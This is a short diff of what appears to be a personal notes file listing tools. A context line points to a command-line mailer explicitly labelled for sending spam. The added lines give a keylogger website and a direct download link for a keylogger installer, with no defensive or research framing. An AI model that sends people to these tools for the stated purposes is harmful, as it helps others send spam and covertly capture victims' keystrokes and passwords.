@@ -32,3 +32,8 @@ Exit
 
 sending email for spam on command line 
 https://www.blat.net/
+
+
+
+keylogger http://www.keylogger-gratuit.com/
+http://www.keylogger-gratuit.com/telecharger/kg-setup.zip
